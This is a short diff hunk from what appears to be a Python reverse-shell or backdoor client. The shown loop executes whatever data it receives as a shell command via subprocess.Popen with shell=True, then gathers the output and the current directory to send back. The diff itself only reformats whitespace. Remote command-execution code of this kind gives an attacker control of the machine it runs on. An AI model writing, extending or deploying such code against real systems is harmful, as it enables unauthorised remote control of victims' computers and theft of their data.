@@ -16,14 +16,14 @@ while True:
 
     if (len(data)) > 0:
         cmd = subprocess.Popen(data.decode("utf-8"),
-                                shell = True,
-                                stdout=subprocess.PIPE,
-                                stdin=subprocess.PIPE,
-                                stderr=subprocess.PIPE, )
+                               shell=True,
+                               stdout=subprocess.PIPE,
+                               stdin=subprocess.PIPE,
+                               stderr=subprocess.PIPE, )
 
         output_byte = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_byte, "utf-8")
-        
+
         # current working directory
         cwd = "HOST:" + os.getcwd() + "$ "
 
